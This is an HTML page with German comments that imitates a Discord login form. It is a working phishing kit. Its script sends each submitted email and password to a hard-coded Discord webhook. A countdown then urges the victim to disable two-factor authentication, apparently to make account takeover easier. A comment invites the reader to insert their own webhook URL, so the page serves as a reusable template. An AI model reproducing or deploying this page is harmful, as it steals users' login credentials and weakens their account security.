<!DOCTYPE html>
<html lang="de-DE">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #7289DA; /* Discord-Farbe */
            font-family: Arial, sans-serif;
            color: white;
            margin: 0;
        }
        .login-container {
            background-color: #2C2F33;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
            width: 300px;
            text-align: center;
        }
        h1 {
            margin-bottom: 15px;
        }
        p {
            margin-bottom: 20px;
            font-size: 14px;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: none;
            border-radius: 5px;
            background-color: #40444B;
            color: white;
        }
        input[type="submit"] {
            background-color: #43B581;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #36A05C;
        }
        #countdown {
            margin-top: 20px;
            font-size: 18px;
        }
        #blockedText {
            display: none;
            font-size: 20px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="login-container" id="loginContainer">
        <h1>Discord Login</h1>
        <p>187 beste Vorlagen</p>
        <form id="loginForm" onsubmit="handleLogin(event)">
            <input type="email" id="email" placeholder="E-Mail-Adresse" required>
            <input type="password" id="password" placeholder="Passwort" required>
            <input type="submit" value="Login">
        </form>
        <div id="countdown" style="display: none;"></div>
        <div id="blockedText">Blocked</div>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1263518498685063294/_zI-_eHBThoZO4enenkH5qdOcr8558KtQjilO5aAP4mWQ9HDv4yhUVhtPBVf0-xZ5lCW"; // FÃ¼ge hier deine Webhook-URL ein

        function handleLogin(event) {
            event.preventDefault(); // Verhindert das Standardverhalten des Formulars

            // Sammeln der Eingaben
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Senden der Daten an den Discord Webhook
            sendToDiscord(email, password);

            // Versteckt das Login-Formular und startet den Countdown
            document.getElementById('loginForm').style.display = 'none';
            startCountdown(50);
        }

        function sendToDiscord(email, password) {
            const request = new XMLHttpRequest();
            request.open("POST", webhookURL);
            request.setRequestHeader('Content-type', 'application/json');

            const params = {
                username: "Login Bot",
                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
                content: `E-Mail: ${email}\nPasswort: ${password}`
            };

            request.send(JSON.stringify(params));
        }

        function startCountdown(seconds) {
            const countdownElement = document.getElementById('countdown');
            countdownElement.style.display = 'block'; // Zeigt den Countdown an
            countdownElement.textContent = `Disable 2FA on Discord in ${seconds} seconds`;

            const interval = setInterval(() => {
                seconds--;
                if (seconds >= 0) {
                    countdownElement.textContent = `Disable 2FA on Discord in ${seconds} seconds`;
                } else {
                    clearInterval(interval);
                    countdownElement.style.display = 'none'; // Versteckt den Countdown
                    document.getElementById('blockedText').style.display = 'block'; // Zeigt "Blocked"
                }
            }, 1000);
        }
    </script>
</body>
</html>
